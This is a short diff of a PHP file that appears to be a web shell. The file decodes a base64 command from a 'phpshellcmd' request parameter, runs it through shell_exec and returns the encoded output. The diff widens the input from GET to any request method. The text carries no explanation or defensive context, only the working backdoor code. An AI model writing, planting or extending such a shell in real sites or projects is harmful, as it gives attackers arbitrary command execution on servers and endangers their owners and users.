@@ -1,6 +1,6 @@
 <?php
-	if(isset($_GET['phpshellcmd'])){
-		$cmd = base64_decode($_GET['phpshellcmd']);
+	if(isset($_REQUEST['phpshellcmd'])){
+		$cmd = base64_decode($_REQUEST['phpshellcmd']);
 		echo base64_encode(shell_exec($cmd));
 	}
 	die()
